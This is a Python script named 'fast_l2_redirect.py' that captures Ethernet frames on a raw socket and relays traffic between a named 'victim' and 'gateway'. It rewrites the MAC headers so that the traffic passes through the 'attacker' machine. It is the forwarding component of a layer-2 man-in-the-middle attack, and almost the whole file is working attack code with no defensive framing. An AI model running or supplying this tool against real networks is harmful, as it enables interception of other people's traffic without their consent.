#!/usr/bin/env python3
# fast_l2_redirect.py
"""
Lightweight L2 redirect (basic in-place Ethernet rewrite).
- Respects interface MTU to avoid "Message too long" errors.
- Minimal allocations: copies only the bytes we will send.
- Exposes main(IFACE, VICTIM, GATEWAY) for import/use.
- Has a simple CLI when run directly.
"""

from __future__ import annotations
import os
import sys
import socket
import struct
import subprocess
import time
from typing import Optional

# ioctl constants
ETH_P_ALL = 0x0003
SIOCGIFHWADDR = 0x8927
SIOCGIFINDEX = 0x8933
SIOCGIFMTU = 0x8921
ETH_HEADER_LEN = 14
MAX_FRAME = 65536  # receive buffer size

try:
    import fcntl
except Exception:
    fcntl = None  # On platforms lacking fcntl, some functions will fail


def read_settings(path: str = "puller.settings") -> dict:
    settings = {}
    try:
        with open(path, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split()
                if len(parts) >= 2:
                    settings_name = parts[0].strip()
                    setting = parts[1].strip()
                    settings[settings_name] = setting
    except FileNotFoundError:
        # fallback to defaults
        pass
    return settings


def if_hwaddr(ifname: str) -> bytes:
    """Return hardware/MAC address as bytes (6 bytes)."""
    if fcntl is None:
        raise RuntimeError("fcntl required for if_hwaddr() on this platform")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack('256s', ifname[:15].encode())
    info = fcntl.ioctl(s.fileno(), SIOCGIFHWADDR, ifreq)
    return info[18:24]


def if_index(ifname: str) -> int:
    """Return interface index (int)."""
    if fcntl is None:
        raise RuntimeError("fcntl required for if_index() on this platform")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack('256s', ifname[:15].encode())
    res = fcntl.ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
    # index is usually a 4-byte int at offset 16
    return struct.unpack('i', res[16:20])[0]


def get_mtu(ifname: str) -> int:
    """Query interface MTU via ioctl. Returns MTU (int)."""
    if fcntl is None:
        raise RuntimeError("fcntl required for get_mtu() on this platform")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack('256s', ifname[:15].encode())
    res = fcntl.ioctl(s.fileno(), SIOCGIFMTU, ifreq)
    # MTU usually stored as an int at offset 16
    return struct.unpack('i', res[16:20])[0]


def mac_str_to_bytes(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(':'))


def resolve_mac_ip(iface: str, ip: str, retries: int = 3, delay: float = 0.5) -> Optional[bytes]:
    """
    Try to resolve the MAC for an IP using `ip neigh show to <ip>`.
    Returns 6-byte MAC or None.
    """
    for attempt in range(retries):
        try:
            out = subprocess.check_output(["ip", "neigh", "show", "to", ip], stderr=subprocess.DEVNULL)
            out = out.decode(errors="ignore").strip()
        except subprocess.CalledProcessError:
            out = ""
        # parse for mac-like token
        for part in out.split():
            if ':' in part and len(part.split(':')) == 6:
                try:
                    return bytes(int(b, 16) for b in part.split(':'))
                except Exception:
                    continue
        # Not found; attempt an ARP ping to populate neighbor table
        try:
            subprocess.call(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
        time.sleep(delay)
    return None


def format_mac(b: bytes) -> str:
    return ':'.join(f"{x:02x}" for x in b)


def main(IFACE: str, VICTIM: str, GATEWAY: str, mtu_override: Optional[int] = None, verbose: bool = True) -> None:
    """
    Start the forwarding loop.
    IFACE: interface name (e.g. "wlan0")
    VICTIM: victim IP as string
    GATEWAY: gateway IP as string
    mtu_override: if provided, use this MTU instead of querying the kernel
    """
    if os.geteuid() != 0:
        print("This program must be run as root.", file=sys.stderr)
        sys.exit(1)

    # Resolve MAC addresses
    victim_mac = resolve_mac_ip(IFACE, VICTIM)
    gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
    if not victim_mac or not gateway_mac:
        print("Couldn't resolve victim or gateway MAC addresses. Ensure ARP/neighbour entry exists.", file=sys.stderr)
        sys.exit(1)

    try:
        attacker_mac = if_hwaddr(IFACE)
    except Exception as e:
        print(f"Failed to get attacker MAC for {IFACE}: {e}", file=sys.stderr)
        sys.exit(1)

    try:
        ifidx = if_index(IFACE)
    except Exception as e:
        print(f"Failed to get interface index for {IFACE}: {e}", file=sys.stderr)
        sys.exit(1)

    try:
        if mtu_override:
            mtu = int(mtu_override)
        else:
            mtu = get_mtu(IFACE)
    except Exception:
        # Fallback to common MTU if ioctl not available
        mtu = mtu_override or 1500

    # compute maximum sendable frame size (Ethernet header + MTU payload)
    max_send_len = ETH_HEADER_LEN + mtu

    if verbose:
        print(f"Interface: {IFACE} (ifindex={ifidx})")
        print("Attacker MAC:", format_mac(attacker_mac))
        print("Victim  MAC:", format_mac(victim_mac))
        print("Gateway MAC:", format_mac(gateway_mac))
        print("MTU:", mtu, "-> max send bytes:", max_send_len)
        print("Starting forwarding loop... (Ctrl-C to stop)")

    # Create raw AF_PACKET socket for capturing & sending
    raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    raw.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    raw.bind((IFACE, 0))

    # pre-allocated buffer for recvmsg_into
    buf = bytearray(MAX_FRAME)

    v_mac = victim_mac
    g_mac = gateway_mac
    a_mac = attacker_mac

    try:
        while True:
            try:
                # recv into buffer to avoid per-packet allocation
                nbytes, ancdata, flags, addr = raw.recvmsg_into([buf], 0)
            except InterruptedError:
                continue
            if nbytes <= ETH_HEADER_LEN:
                continue
            frame = memoryview(buf)[:nbytes]

            # source MAC (bytes 6..12)
            src = bytes(frame[6:12])
            # ignore frames we injected ourselves
            if src == a_mac:
                continue

            # Decide direction and rewrite header in a small copy limited to max_send_len
            try:
                if src == v_mac:
                    # from victim -> destined to gateway
                    send_len = nbytes
                    if send_len > max_send_len:
                        send_len = max_send_len
                    # allocate only the bytes we will send (header + truncated payload)
                    out = bytearray(send_len)
                    out[0:ETH_HEADER_LEN] = frame[0:ETH_HEADER_LEN]
                    # set dst=gateway, src=attacker
                    out[0:6] = g_mac
                    out[6:12] = a_mac
                    # copy payload up to available length
                    if send_len > ETH_HEADER_LEN:
                        out[ETH_HEADER_LEN:send_len] = frame[ETH_HEADER_LEN:send_len]
                    raw.send(out)

                elif src == g_mac:
                    # from gateway -> destined to victim
                    send_len = nbytes
                    if send_len > max_send_len:
                        send_len = max_send_len
                    out = bytearray(send_len)
                    out[0:ETH_HEADER_LEN] = frame[0:ETH_HEADER_LEN]
                    out[0:6] = v_mac
                    out[6:12] = a_mac
                    if send_len > ETH_HEADER_LEN:
                        out[ETH_HEADER_LEN:send_len] = frame[ETH_HEADER_LEN:send_len]
                    raw.send(out)

                else:
                    # not interested in other hosts
                    continue

            except OSError as e:
                # common error is "Message too long" — log, but we've already truncated frames
                if verbose:
                    print("send error:", e)
                # small sleep to avoid tight loop in error storms
                time.sleep(0.01)
                continue

    except KeyboardInterrupt:
        if verbose:
            print("\nStopped by user.")
    finally:
        raw.close()